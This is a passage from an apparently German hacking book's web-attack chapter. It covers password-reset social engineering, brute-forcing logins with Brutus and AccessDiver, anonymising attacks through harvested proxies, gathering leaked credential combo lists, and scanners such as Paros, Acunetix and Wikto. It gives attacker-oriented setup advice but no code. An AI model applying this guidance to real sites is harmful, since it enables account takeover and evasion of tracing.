Verfahren, das auch viele Kriminelle nutzen. Social Engineering Variante 3 Wir beschaffen uns die Daten \u00fcber den E-Mail-Account des Opfers, wobei die E-MailAdresse, die im Impressum der Webseite bzw. bei der DENIC hinterlegt ist, sicherlich den gr\u00f6\u00dften Erfolg verspricht. Da die meisten E-Mail-Provider Brute-Force-Angriffen einen Riegel vorgeschoben haben und die E-Mail-Adresse nach mehrmaliger Falscheingabe sperren, nutzen wir die bei vielen Providern hinterlegte Geheimabfrage. Das soll einem vergesslichen User helfen, sich leichter an sein Passwort erinnern zu k\u00f6nnen. Wenn wir zuvor etwas Data-Mining betrieben, uns also mit der Vita des Opfers besch\u00e4ftigt haben, k\u00f6nnen wir unter Umst\u00e4nden einen Gl\u00fcckstreffer landen. Einen ausgesprochenen Gl\u00fcckstreffer dieser Art landete auch der Hacker des Mailaccounts von Sarah Palin, die sich 2008 auf Seiten der Republikaner um die US-Vizepr\u00e4sidentschaft bewarb: \u00bbIn den Tagen vor dem Hack war ruchbar geworden, Sarah Palin wickele mitunter Amtsgesch\u00e4fte \u00fcber eine private Mailadresse bei Yahoo ab. Rubico fand einen Account namens\n[[email protected]](/cdn-cgi/l/email-protection)\nund ben\u00f6tigte zum Eindringen nicht einmal das Kennwort der Gouverneurin. Haben Yahoo-Anwender ihr Passwort vergessen, k\u00f6nnen sie sich anhand dreier Fragen ausweisen und erhalten dann Zugriff auf ihren Account. Der Hacker fand aus \u00f6ffentlich zug\u00e4nglichen Informationen \u00fcber Palin deren Geburtstag, ihre Postleitzahl und die Antwort auf die Sicherheitsfrage heraus und setzte dann sein eigenes Kennwort.\u00ab82 Wenn das alles nicht zum Erfolg f\u00fchrt, bleibt immer noch die Brute-Force-Attacke. Hier streiten sich einige Produkte um die Gunst des Angreifers. Das klassische Tool in der Windows-Welt ist Brutus, Allzweckwaffe zum Knacken von Internet-Accounts (FTP, HTTP, POP3, Telnet, NetBIOS etc).\n82\nwww.heise.de/newsticker/meldung/Sarah-Palin-Der-Mail-Hack-der-keiner-war-207052.html\n230\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.11: Brutus, der (schon etwas in die Jahre gekommene) Universalknacker\nIn das Feld Target tr\u00e4gt man die URL oder IP-Adresse des Ziel-PCs ein, dann w\u00e4hlt man unter Type die Art des Angriffs, z. B. HTTP (Form), wenn sich z. B. auf der Anmeldeseite ein Login-Formular befindet. In diesem Fall m\u00fcsste man nat\u00fcrlich auch den zugeh\u00f6rigen Port 80 (analog Port 21 f\u00fcr FTP etc.) ankreuzen. Port: Angabe des Ports, im Falle von HTTP Port 80 oder bei FTP 21. Mit Connections und Timeout definiert man, wie oft die Verbindung herzustellen ist und nach welcher Zeit sie getrennt werden soll. Ein sehr n\u00fctzliches Feature, um die Angriffe einigerma\u00dfen anonym durchzuf\u00fchren, ist die Umleitung \u00fcber einen Proxyserver. Eine Liste anonymer Proxies findet man z. B. bei www.proxy4free.com. Bedenken Sie bei der Auswahl Folgendes: Manche Proxies sind alles andere als anonym, verbergen also ihre IP-Adresse nur unzureichend; bei einem tats\u00e4chlichen Einbruch w\u00e4ren sie r\u00fcckverfolgbar. Noch sicherer f\u00fchlen sich viele Hacker, wenn der Proxy sich zus\u00e4tzlich auf einem anderen Kontinent befindet. In diesem Fall muss der Proxy aber \u00fcber eine ordentliche Bandbreite verf\u00fcgen, um den Anwender nicht auszubremsen.\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n231\nUnter Method gibt man an, auf welche Weise die Kommunikation mit der Webseite stattfinden soll: GET ist die gebr\u00e4uchlichste Methode, um Inhalte vom Server anzufordern; bei HEAD wird der Server angewiesen, die gleichen HTTP-Header wie bei GET oder POST zu senden, nicht jedoch den eigentlichen Dokumentinhalt. Ein H\u00e4kchen bei KeepAlive h\u00e4lt die Verbindung aufrecht und ein aktiviertes Fake Cookies suggeriert dem Zielrechner, mit dem entsprechenden User auch tats\u00e4chlich verbunden zu sein. Spannend wird es noch mal bei den Authentication Options. Hat man den mutma\u00dflichen Usernamen (oder mehrere davon), verk\u00fcrzt sich die Zeit, bis Brutus eine g\u00fcltige Kombination aus User-Login und Passwort findet, um einige Gr\u00f6\u00dfenordnungen. Ansonsten setzt man auf die beiliegende Datei Users.txt mit den g\u00e4ngigsten Kennungen. Das zugeh\u00f6rige Passwort kann jetzt mit einem Dictionary-Angriff (word list, combo list) oder durch Ausprobieren (brute force) erraten werden. Ist Brutus f\u00fcndig geworden, stehen die Treffer im Fenster Positive Authentication Results. Der Dictionary-Angriff gewinnt eine neue Dimension, wenn man von Fall zu Fall unterschiedliche, z. B. l\u00e4nderspezifische Wortlisten vorgibt. Auf Seiten wie www.morehouse.org/hin/wordlists.html findet man Dutzende von speziellen Wortlisten, die man auch mit anderen Brute-Forcern kombinieren kann. Was dem einen sein Brutus, ist dem anderen seine Hydra oder seine Medusa, die sich speziell unter Unix/Linux-Anwendern gro\u00dfer Beliebtheit erfreut und inzwischen auch als Kommandozeilentool unter Windows l\u00e4uft. Mehr dazu im Kapitel 18, \u00bbNetzwerkarbyten\u00ab.\n15.6\nSicherheitsl\u00fccken systematisch erforschen\nDie meisten der Tools, die wir auf den vorangegangenen Seiten beschrieben haben, sind einfachere Werkzeuge, die mehr f\u00fcr Script-Kiddies und angehende Hacker als f\u00fcr Security-Profis interessant sind. Etwa in der Mitte zwischen diesen und professionellen Web-Vulnerability Scannern wie beispielsweise Paros83 oder Acunetix84 stehen neuere Tools wie der AccessDiver.\n15.6.1 AccessDiver Seine Entwickler beschrieben des AccessDiver als \u00bbsoftware which can detect security failures on your web pages. It has multiple efficient tools which will verify the robustness of your accounts and directories accurately. So, you will know if your customers, your users and yourself can safely use your web site.\u00ab Auf der anderen Seite findet man nat\u00fcrlich im Internet auch handfeste Beschreibungen, wie man mit diesem Tool Webseiten, im Besonderen zum Beispiel Pornoseiten85, knacken kann. Seit 2007 ist das Tool nicht sonderlich weiterentwickelt worden. Die aktuellste im Netz auffindbare Variante\n83\nwww.parosproxy.org/index.shtml\n84\nwww.acunetix.com\n85\nboard.raidrush.ws/showthread.php?t=553\n232\nKapitel 15 \u2013 Szenario IV: Web Attack\nist die Version 4.402, die leider nicht mehr so stabil l\u00e4uft wie die im Folgenden beschriebene Vorg\u00e4ngerversion. Aber schauen wir uns das Tool einmal im Detail an. Nach dem Start sollte man zuerst den Expertenmodus im Men\u00fcpunkt My Skill aktivieren, da ansonsten einige wichtige Einstellungen nicht zur Verf\u00fcgung stehen. Bevor Sie jetzt das erstbeste Angriffsziel in die Eingabezeile Server eintragen, raten wir Ihnen, sich erst mit den Settings etwas n\u00e4her zu befassen.\nBild 15.12: AccessDiver richtig konfigurieren\nDie wichtigsten Einstellungen bei den Settings sind die Punkte Search und Access. Bei Letzterem sollten Sie hinter Let a Bot, Always force und Never Stop einen Haken setzen, um fr\u00fchzeitige bzw. voreilige Scanabbr\u00fcche abzufangen. Eventuell sollten Sie auch bei Temporisation einen Haken setzen und die Loginversuche auf 2000 alle 5 Sekunden begrenzen; ansonsten laufen Sie Gefahr, dass Sie von Honeypots gefakt werden. Um \u00fcberlange Suchzeiten zu vermeiden, sollten Sie bei der Search-Option f\u00fcr den Anfang die Stellenzahl f\u00fcr Username und Passwort auf jeweils maximal 12 Zeichen beschr\u00e4nken.\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n233\nBild 15.13: Search-Optionen beim AccessDiver\nDie gr\u00f6\u00dfte Einstellorgie gibt\u2019s beim Thema Proxy. Ein Angreifer wird, um so wenig Spuren wie m\u00f6glich zu hinterlassen, nicht ohne Proxy einen Brute-Force-Angriff starten. Der AccessDiver bietet hier sehr viele M\u00f6glichkeiten, seine Spuren zu verwischen, z. B. mit rotierenden Proxies. Die beste Konfiguration k\u00f6nnte so aussehen:\nBild 15.14: Proxygrundkonfiguration\n15.6.2 Spuren verwischen mit ProxyHunter Jetzt haben wir nat\u00fcrlich noch keine Proxies eingebunden. Fertige Listen mit verwendbaren Proxies gibt es z. B. auf http://www.proxy-listen.de. Wenn Sie eine solche Liste herunterladen oder mit Copy & Paste in eine Textdatei kopieren, achten Sie bitte darauf, dass jede Adresse in der Form 111.111.1.111:8080 (also IP-Adresse, Doppelpunkt, PortNr.) aufgef\u00fchrt wird, sonst kann AccessDiver sie nicht importieren. Da die Nachfrage nach anonymen Proxyservern gro\u00df ist, kann es nat\u00fcrlich vorkommen, dass die Proxies verstopft oder schlichtweg nicht zu erreichen sind. In diesen F\u00e4llen kann man mit einem\n234\nKapitel 15 \u2013 Szenario IV: Web Attack\nProxy-Hunter auf die Jagd gehen und bestimmte IP-Bereiche nach offenen Proxies abscannen. Entweder nimmt man daf\u00fcr das gleichnamige Tool ProxyHunter (siehe Teil I: \u00bbTools \u2013 Werkzeuge f\u00fcr Angriff & Verteidigung\u00ab) oder man benutzt daf\u00fcr den integrierten Proxy Hunter des AccessDivers. Die gefundenen Proxies m\u00fcssen vor ihrer Verwendung validiert werden. Importieren Sie dazu Ihre Proxyliste in den Proxy Analyzer des AccessDivers.\nBild 15.15: Eigene Proxylisten mit ProxyHunter generieren\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n235\nBild 15.16: Importieren einer Proxyliste\nIm n\u00e4chsten Schritt werden diejenigen Proxies ausgefiltert, die nicht zu erreichen, zu langsam oder nicht anonym sind. Daf\u00fcr gibt es den Speed/Accuracy Checker und den Confidentiality Tester. Um m\u00f6glichst wenig Zeit zu verlieren, verwenden wir erst den Speed Checker, sortieren die nicht erreichbaren mit dem Befehl delete bad results and time outs aus dem Kontextmen\u00fc aus und testen dann auf Vertrauensw\u00fcrdigkeit bzw. Anonymit\u00e4t. Leider bleiben dann nicht mehr so sehr viele Proxies \u00fcbrig.\nBild 15.17: Filtern von Proxies mit dem AccessDiver\n236\nKapitel 15 \u2013 Szenario IV: Web Attack\nSollten sich Probleme mit dem Confidentiality Tester ergeben, liegt das meistens an nicht mehr aktuellen Proxyjudges, die sich unter dem Men\u00fcpunkt Anonymity Checkers finden und die den Anonymit\u00e4tslevel von Proxyservern ermitteln. Sie lassen sich in den AccessDiver importieren und dort \u00fcberpr\u00fcfen. F\u00fcr anonym gef\u00fchrte Angriffe sind wie in unserem Fall zwei anonyme Proxies viel zu wenig. Hier muss also die beschriebene Prozedur etliche Male durchlaufen werden. Hilfsweise kann man auch im Nahraum bereits gefundener Proxyserver nach weiteren Servern Ausschau halten. Zu diesem Zweck geht man im AccessDiver in die analyzed proxies und aktiviert dort im Kontextmen\u00fc den entsprechenden Befehl. Im Anschluss daran wird der IP-Bereich in den integrierten ProxyHunter \u00fcbernommen und die Suche gestartet.\nBild 15.18: Validieren von Proxyjudges\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n237\nBild 15.19: Suche nach weiteren Proxies\nZuletzt sollte man die in m\u00fchsamer Kleinarbeit erstellte Proxyliste sichern und in My LIST zur weiteren Verwendung laden. Einer der Vorteile des AccessDivers besteht n\u00e4mlich darin, diese Proxies auch f\u00fcrs anonyme Surfen konfigurieren zu k\u00f6nnen.\n15.6.3 Passwortlisten konfigurieren Steht die Proxyliste, gilt es im n\u00e4chsten Schritt die Wortlisten zu konfigurieren \u2013 neben der Proxyeinrichtung der vielleicht wichtigste Punkt f\u00fcr das erfolgreiche Hacken von Webseiten.\n238\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.20: Pr\u00e4parieren der Wortlisten f\u00fcr den Angriff\nDa der AccessDiver speziell f\u00fcr den Zweck programmiert wurde, passwortgesch\u00fctzte Login-Seiten zu knacken, hat der Autor viel Wert auf eine gut konfigurierbare Einstellung beim Dictionary-Modul gelegt. Grunds\u00e4tzlich gibt es zwei unterschiedliche M\u00f6glichkeiten, Login- und Passwortdaten f\u00fcr den Dictionary-Angriff bereitzustellen: entweder als getrennte, unabh\u00e4ngig voneinander existierende Inputlisten (Username List + Password List), oder man l\u00e4dt gleich eine Combodatei in den AccessDiver. Combo-Files sollten so aussehen:\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n239\nBild 15.21: Comboliste\nBei der Zusammenstellung von Combolisten wird ein gewiefter Hacker auf Besonderheiten seines Angriffsziels achten. Es macht n\u00e4mlich keinen Sinn, eine spanische Webseite mit einer englischen oder amerikanischen Comboliste hacken zu wollen. Hier ist man also gut beraten, entsprechend landessprachlich angepasste Wortlisten zu verwenden. Im \u00dcbrigen sollte man sich nat\u00fcrlich auch vorab \u00fcber den seitenspezifischen Aufbau von Logins informieren. Wenn der Loginname z. B. immer eine E-MailAdresse ist, macht es keinen Sinn, mit einer Standardcomboliste zu arbeiten. Wie aber kommt man als Anf\u00e4nger zu einer brauchbaren Comboliste?\n15.6.4 Wortlisten im Eigenbau Die einfachste M\u00f6glichkeit, an eine Wortliste zu kommen, besteht darin, sich selbst eine zu erstellen, z. B. mit einem Generator, wie er von AccessDiver bereitgestellt wird. Zun\u00e4chst w\u00e4hlt man einen Namensbestandteil, z. B. Hans, plus ein entsprechendes Makro aus. Das Programm generiert anschlie\u00dfend die Wortliste, die in unserem Fall aus den W\u00f6rtern 1000snaH bis 2000snaH besteht. Sehr viel universeller einsetzbar und ein unbedingtes Muss f\u00fcr jeden Webseitenhacker ist Raptor 3, ein Tool, mit dem sich Combolisten erstellen, filtern, mischen, selektieren und manipulieren lassen (kostenfrei unter https://www.xisp.org/downloads.html).\n240\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.22: Erzeugen von Wortlisten\nBild 15.23: Raptor 3: Universaltool zum Erstellen von Combolisten\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n241\nErfolgversprechender und f\u00fcrs Erste weniger aufwendig ist das Online-Leechen von Combolisten. Daf\u00fcr eignet sich insbesondere das Programm Athena86, mit dem man in Google nach geposteten Combos suchen kann, d. h., von bekannten Seiten werden alle Links, die eine Username/Passwort-Combo enthalten, offline zur Verf\u00fcgung gestellt. Alternativ kann man daf\u00fcr auch den Site-Leecher des AccessDivers verwenden. Man gibt diesem als Startadresse eine von vielen Passwortseiten mit, woraufhin das Tool daraus die Logins und die zugeh\u00f6rigen Passw\u00f6rter extrahiert und wahlweise in die bestehende Comboliste integriert.\nBild 15.24: Der Site-Leecher des AccessDrivers\n15.6.5 Websecurity-Scanner: Paros Hat man jetzt seine Proxies und die Comboliste(n) selektiert, kann es endlich losgehen. Als Angriffsobjekte kommen alle Seiten in Betracht, \u00fcber die man sich mit der klassischen Kombination aus Benutzername und Passwort einloggen muss. In die Kategorie Brute Forcer f\u00e4llt X-Factor von www.xisp.org. Das Tool sucht zwar ebenso wie AccessDiver Zielseiten nach Sicherheitsl\u00fccken ab, kann aber klassischen\n86\nwww.snakeoillabs.com\n242\nKapitel 15 \u2013 Szenario IV: Web Attack\nSchwachstellenscannern wie Acunetix Vulnerability Scanner87, Paros 88 oder Wikto89 nicht das Wasser reichen. Die Bedienung von Paros wirkt auf den ersten Blick etwas gew\u00f6hnungsbed\u00fcrftig. Um das komplett in Java programmierte Tool zur Zusammenarbeit zu bewegen, braucht man erst einmal die aktuelle Java Runtime Engine (JRE). Danach geht es an die Konfiguration. Die Einstellungen sind zwar mehr oder minder unkritisch, aber man muss unbedingt sicherstellen, dass die Proxyeinstellungen von Paros mit dem f\u00fcr die Analyse ben\u00f6tigten Internetbrowser \u00fcbereinstimmen.\nBild 15.25: Ohne die richtigen Proxyeinstellungen l\u00e4uft mit Paros nichts.\nDie gew\u00e4hlten Werte (in unserem Fall localhost auf Port 8080) m\u00fcssen dann in die entsprechenden Browsereinstellungen \u00fcbernommen werden. Im Internet Explorer finden sich diese Einstellungen unter Internet Options / Local Area Network (LAN) Settings. Das eher ungew\u00f6hnliche Bedienerkonzept von Paros zeigt sich, wenn man die Zieladresse im Webbrowser eingibt. Ab diesem Punkt protokolliert Paros alle GET- und POST-Requests bzw. -Responses. Wahlweise sammelt der in Paros integrierte Spider auch Seiteninformationen. Mit dem Analysewerkzeug l\u00e4sst sich damit die Anf\u00e4lligkeit der Webseite gegen\u00fcber SQL-Injection testen.\n87\nkommerzielles Produkt, Demo unter: www.acunetix.com\n88\nhttp://www.parosproxy.org/index.shtml\n89\nhttp://www.sensepost.com/research/wikto\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n243\nBild 15.26: Paros checkt unter Alerts die Anf\u00e4lligkeit f\u00fcr Schwachstellen.\nAuf Wunsch generiert Paros auch einen HTML-Report.\nBild 15.27: Der Web-Report von Paros\n15.6.6 Websecurity-Scanner: WVS In der Oberliga der Websecurity-Scanner spielen Tools wie der Acunetix Web Vulnerability Scanner (VWS) oder auch Wikto. Einerseits werden diese Tools in kurzen Abst\u00e4nden aktualisiert, sodass die neuesten Angriffstechniken bzw. Exploits zur Verf\u00fcgung stehen. Auf der anderen Seite ist aber auch die Scanbreite gr\u00f6\u00dfer: Es werden nicht nur klassische L\u00fccken wie SQL-Injection oder Cross-Site-Scripting abgetastet, sondern auch gleich Schw\u00e4chen in den Bereichen Authentifizierung, Directory-Enumeration und Parametermanipulation aufgedeckt. WVS arbeitet eine Zielseite in einem vierstufigen Prozess ab:\n244\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.28: Arbeitsweise WVS\nIn der Angriffssphase werden CGI-Scanner (anf\u00e4llige Webservertechnologien), File Checker (z. B. Script Errors, Backup-Files), Directory Checker (Log- und Tracefiles), Text Searcher (Vorhandensein von Sourcecodes, E-Mail-Adressen etc.) und die schon bekannte Google-Hacking Database eingesetzt. Als Highlight verf\u00fcgt der WVS \u00fcber M\u00f6glichkeiten umfangreicher Parametermanipulation, unter anderem: \u2022\n\u00dcber 25 XSS-Varianten\n\u2022\nSQL-Injection\n\u2022\nLDAP-Injection\n\u2022\nXPath-Injection\n\u2022\nPHP-Injection\n\u2022\nCode-Execution\n\u2022\nDirectory-Traversal\n\u2022\nFile-Inclusion\n\u2022\nScript Source Code Disclosure\n\u2022\nCRLF-Injection\nDie Bedienung des Acunetix-Tools ist ebenso simpel wie effektiv. Man braucht nicht unbedingt ein Sicherheitsexperte zu sein, um eine umfassende Sicherheitsanalyse zu erstellen. Didaktisch hervorragend aufgemacht ist auch das mitgelieferte, fast zweihundert Seiten starke Online-Manual, das durch seinen Top-Down-Erkl\u00e4rungsansatz f\u00fcr Experten wie interessierte Laien gleicherma\u00dfen gut geeignet ist. Nach der Eingabe des Angriffsziels und einiger weniger Zusatzangaben f\u00e4ngt der WVS an, die Seite zu durchforsten. Das Analysetempo ist beachtlich. Je nach Gr\u00f6\u00dfe und Umfang der Webseite ist die Analyse nach 60 bis 90 Minuten abgeschlossen.\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n245\nBild 15.29: \u00dcbersichtliches Scanergebnis nach kurzer Zeit\nDas Tool fand auf unserer Testseite zwei gravierende Schwachstellen, vier mittelschwere Fehler und 85 kleinere Einschr\u00e4nkungen. Im n\u00e4chsten Schritt k\u00f6nnte sich ein Angreifer daf\u00fcr entscheiden, seinen beabsichtigten Angriff in einem Feintuning noch besser vorzubereiten. Auch darin unterst\u00fctzt ihn WVS mit einer Reihe von Werkzeugen: \u2022\nHTTP Editor Der HTTP Editor bietet Unterst\u00fctzung beim \u00dcberarbeiten bzw. Neuanlegen von Requests, mit denen die Reaktion und die R\u00fcckgabewerte des Webservers \u00fcberpr\u00fcft werden k\u00f6nnen. Der Angreifer kann testen, wie der Host auf spezielle Techniken bei SQL-Injection und Cross-Site-Scripting (XSS) reagiert.\n\u2022\nHTTP Sniffer Das HTTP-Snifferwerkzeug funktioniert \u00e4hnlich wie bei Paros: Der Verkehr zwischen Webclient (ein Webbrowser, der \u00fcber einen Proxy gesteuert wird) und Webserver kann gezielt \u00fcber WVS \u00fcberwacht und manipuliert werden. Zur gezielten Datenmanipulation z. B. f\u00fcr HTTP-Requests k\u00f6nnen regelbasierte Traps verwendet werden.\n\u2022\nAuthentication Test Tool Hiermit lassen sich (Passwort-)Schw\u00e4chen beim Anmelden auf der Seite testen.\n246\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.30: Aufdecken von schwachen Logins\n\u2022\nHTTP Fuzzer Den Fuzzer verwendet ein Angreifer, um Buffer-Overflows zu provozieren. Hauptbestandteil dieses Werkzeugs ist ein Buchstabengenerator, der die Eingaben auf Webseiten (in der Form von http://angriffsziel.com/produkte.php?cat=1) innerhalb einer vorgegebenen Range manipulieren kann, z. B. durch Ersetzen der \u00bb1\u00ab durch Nummern von 1 bis 999.\nSolcherma\u00dfen hochger\u00fcstet, kann ein potenzieller Angreifer mit einer guten Datenbasis seinen Hack starten. Allerdings hat ein solcher Leistungsumfang durchaus seinen Preis. So kostet die Consultant-Version, mit der man als Berater unbeschr\u00e4nkt beliebig viele Webseiten ein Jahr lang scannen und den Herstellersupport unbegrenzt in Anspruch nehmen kann, 3.250 US-Dollar. Firmenlizenzen (um seine Firmenserver zu scannen) sind ca. 1000 US-Dollar g\u00fcnstiger. Von daher ist einigerma\u00dfen sichergestellt, dass ein Wald-und-Wiesen-Hacker diese Investition vermutlich scheuen wird. Um sich einen ersten Eindruck von der Leistungsf\u00e4higkeit dieser Software zu machen, reicht durchaus die Demolizenz90, mit der man sich allerdings nur an einer vom Hersteller vorgegebenen Webseite austoben kann.\n15.6.7 Websecurity-Scanner: Wikto Das kostenlose Tool Wikto von Sensepost ist f\u00fcr engagierte Webmaster und kleinere Firmen sicherlich gut geeignet, um die Sicherheit ihrer Webseiten zu \u00fcberpr\u00fcfen. Um es vorweg zu sagen: Es gibt Dinge, die Wikto nicht beherrscht. Das Tool kann im Gegensatz zu VWS weder die Anf\u00e4lligkeiten von Webseiten gegen\u00fcber SQL-Injections noch die Sicherheitseinstellungen von Firewalls oder Authentifizierungsprobleme \u00fcberpr\u00fcfen.\n90\nNach pers\u00f6nlichem Kontakt stellt der Anbieter aber auch eine voll funktionsf\u00e4hige Trialversion befristet zur Verf\u00fcgung.\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n247\nWikto bietet aber immer noch so viel, dass es sich gut f\u00fcr Angriffs- und Verteidigungszwecke einsetzen l\u00e4sst. Wikto (manche haben es auch Nikto for Windows genannt) kommt als eine Art Framework auf den Rechner. Im Gegensatz zu fr\u00fcheren Versionen hat sich die Bedienung ab der Version 2 (ab .Net Framework 2.0) vereinfacht. W\u00e4hrend in der \u00e4lteren Version noch Googles Search-API zum Einsatz kam, \u00fcbernimmt jetzt SPUD (Download auf www.sensepost.com) diese Aufgabe.\nBild 15.31: Vereinfachte Eingabe \u00fcber den Scan Wizard\nSinnvollerweise startet man die Untersuchung \u00fcber den SPIDER, der die Verzeichnisstruktur sowie die externen Links auflistet.\nBild 15.32: Sammeln der ersten Informationen\n248\nKapitel 15 \u2013 Szenario IV: Web Attack\nDer Googler von Wikto verf\u00fcgt \u00fcber eine doppelte Funktionalit\u00e4t: Erstens werden \u2013 vergleichbar mit der Mirror-Funktion \u2013 die relevanten Unterverzeichnisse einer Webseite aufgelistet; zweitens kann man die Seite nach bestimmten Dateitypen (z. B. Doc, PDF, XLS, ZIP) scannen lassen. Das Besondere dieser Funktion: Der Scanjob erfolgt nicht vom heimischen PC aus, sondern wird an Google delegiert. Der Vorteil: Man hinterl\u00e4sst gerade beim ersten informativen Zugriff auf die Seite \u00fcberhaupt keine Spuren. In der Wahl der Dateitypen ist man frei; die Aufz\u00e4hlung erfolgt jeweils mit Komma, aber ohne Leerzeichen. Beim Google-Keyword hei\u00dft es aber aufpassen. Wenn man beispielsweise die ZDF-Seite auf www.zdf.de scannt und namentlich die Dokumente sucht, die einen Zusammenhang mit dem Fernsehsender aufweisen, gibt man einfach nur zdf ein.\nBild 15.33: Wikto Googler bei der Arbeit\n\u00dcber Google-Hacks haben wir schon gesprochen. Jonny Long91, der inoffizielle K\u00f6nig aller Google-Hacker und Autor des Buches \u00bbGoogle-Hacking for Penetration Testers\u00ab aktualisiert in kurzen Abst\u00e4nden seine Datenbank mit interessanten Angriffszielen, die via Google indiziert werden k\u00f6nnen. Auf diese Datenbank greift Wikto zu und untersucht, inwieweit die Zieladresse bekannte Schwachstellen aufweist. Alles, was man tun muss, ist, die aktualisierte Google-Hacking Dating Base (GHDB) zu laden, die Zieladresse einzugeben und den Startknopf zu dr\u00fccken. Das Modul l\u00e4dt nun im oberen Fenster in sequenzieller Reihenfolge alle in der Datenbank befindlichen Hacks, gibt im mittleren Fenster einen Erl\u00e4uterungstext aus und zeigt im letzten, unteren Fenster, 91\nhttp://johnny.ihackstuff.com\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n249\nwelche Seiten unserer Zieladresse gegebenenfalls spezifische Schwachstellen aufweisen. In der unteren Reihe zieht man einen Fortschrittsbalken, der den aktuellen Scanstatus anzeigt. Je nach Seitenumfang und in Abh\u00e4ngigkeit davon, ob man parallel andere Wikto-Tasks durchf\u00fchrt, kann ein kompletter Scan durchaus eine bis zwei Stunden in Anspruch nehmen.\nBild 15.34: Google-Hacking mit Wikto\nSehr einfach zu bedienen und auch vom Zweck her leicht zu verstehen ist ein anderes Modul von Wikto: BackEnd. Der Name ist Programm: Er leitet sich ab von den Backend-Interfaces, mit denen Administratoren Zugriff auf Dateien und Verzeichnisse haben, die sich nicht \u00fcber den Webbrowser aufrufen lassen. Genau das macht das Wikto Backend: Es sucht auf einer Webseite anhand von bestimmten Vorgaben nach sonst nicht zug\u00e4nglichen Verzeichnissen und Dateien. Im ersten Schritt wird man sinnvollerweise die Schl\u00fcsselbegriffe des BackEnds aktualisieren. Allerdings sollte man beachten, dass das Data-Mining anhand s\u00e4mtlicher Suchbegriffe bei gr\u00f6\u00dferen Seiten mehr im Stunden- als im Minutenbereich liegt. Bei der Suche nach Dateien und Verzeichnissen kann die AI-Checkbox helfen, \u00bbfalse positives\u00ab zu vermeiden. Normalerweise gibt es die Fehlermeldung 404, wenn eine Seite angesprochen wird, die nicht existiert. Da mitunter aber auch vom Webserver andere (Fehler-)Codes zur\u00fcckgegeben werden, aufgrund derer das Programm schlie\u00dfen k\u00f6nnte, dass die Seite bzw. das Verzeichnis oder die Datei dennoch existiert, ist es sinnvoll, diese Fehler auszufiltern, um den Angreifer nicht auf eine falsche F\u00e4hrte zu locken. Zu diesem Zweck nutzen BackEnd und Wikto einen Algorithmus, der auf k\u00fcnstlicher Intelligenz basiert.\n250\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.35: Mit Wikto Backend auf der Suche nach interessanten Verzeichnissen und Dateien\nDas interessanteste Modul hat gleichzeitig dem gesamten Programmpaket seinen Namen gegeben: Wikto. Um die Arbeitsweise von Wikto zu verstehen, sollte man zuvor einen Blick auf den Open-Source Vulnerability Webscanner Nikto92 werfen, der \u00fcber eine Reihe sehr interessanter Features verf\u00fcgt: \u2022\nUses rfp\u2019s LibWhisker as a base for all network funtionality\n\u2022\nMain scan database in CSV format for easy updates\n\u2022\nDetermines \u00bbOK\u00ab vs \u00bbNOT FOUND\u00ab responses for each server, if possible\n\u2022\nDetermines CGI directories for each server, if possible\n\u2022\nSwitch HTTP versions as needed so that the server understands requests properly\n\u2022\nSSL Support (Unix with OpenSSL or maybe Windows with ActiveState\u2019s Perl/NetSSL)\n\u2022\nOutput to file in plain text, HTML or CSV\n\u2022\nGeneric and \u00bbserver type\u00ab specific checks\n\u2022\nPlugin support (standard PERL)\n\u2022\nChecks for outdated server software\n\u2022\nProxy support (with authentication)\n92\nhttp://cirt.net/nikto2\n15.6 Sicherheitsl\u00fccken systematisch erforschen\n251\n\u2022\nHost authentication (Basic)\n\u2022\nWatches for \u00bbbogus\u00ab OK responses\n\u2022\nAttempts to perform educated guesses for Authentication realms\n\u2022\nCaptures/prints any Cookies received\n\u2022\nMutate mode to \u00bbgo fishing\u00ab on web servers for odd items\n\u2022\nBuilds Mutate checks based on robots.txt entries (if present)\n\u2022\nScan multiple ports on a target to find web servers (can integrate nmap for speed, if available)\n\u2022\nMultiple IDS evasion techniques\n\u2022\nUsers can add a custom scan database\n\u2022\nSupports automatic code/check updates (with web access)\n\u2022\nMultiple host/port scanning (scan list files)\n\u2022\nUsername guessing plugin via the cgiwrap program and Apache ~user methods\nWikto nutzt bei seinen Sicherheitsscans die Datenbasis von Nikto; er ist au\u00dferdem in der Lage, die Ergebnisse in anderen Modulen (BackEnd, Googler) weiterzuverwenden. Bevor man die Zieladresse eingibt und die Nikto-Datenbank l\u00e4dt, muss man \u00fcberlegen, ob man die auch in diesem Modul vorhandene AI-Checkbox aktiviert oder nicht. Wir w\u00fcrden das H\u00e4kchen setzen, damit wir uns hinterher nicht mit einer Unzahl von Fehlalarmen herumschlagen m\u00fcssen. Normalerweise arbeitet das Programm mit einem Schwellwert von 0,900. Dr\u00fcckt man z. B. den Reset-Button, \u00e4ndert sich die Anzeige dramatisch. Man kann auch im laufenden Scan den Schwellwert jederzeit ver\u00e4ndern und den Update-Button dr\u00fccken. Einfach ausprobieren!\nBild 15.36: Schwachstellenscan durch Wikto\n252\nKapitel 15 \u2013 Szenario IV: Web Attack\nWenn man will, kann man sich die Analyse auch als Excel-Report ausgeben lassen. Als entscheidenden Nachteil empfanden wir aber die relative Un\u00fcbersichtlichkeit sowohl im Reporting als auch in der Realtime-Anzeige. Um die gravierendsten Schwachstellen f\u00fcr einen beabsichtigten Angriff mit Exploits herauszufiltern, muss man einiges an Zeit investieren \u2013 das haben einige Tools mit einer gewichteten Schwachstellenauswertung besser gel\u00f6st. Schwachstellenscanner sind in der Regel aber keine direkten Angriffswerkzeuge. Um die Schwachstellen real auszunutzen, d. h. um Webserver zu manipulieren und auszusp\u00e4hen, braucht man geeignete Angriffsskripts. Den entscheidenden Tipp, mit welchen Exploits das zu bewerkstelligen ist, liefern die Webscanner allerdings meistens mit. Entweder man googelt nun nach den vorgegebenen 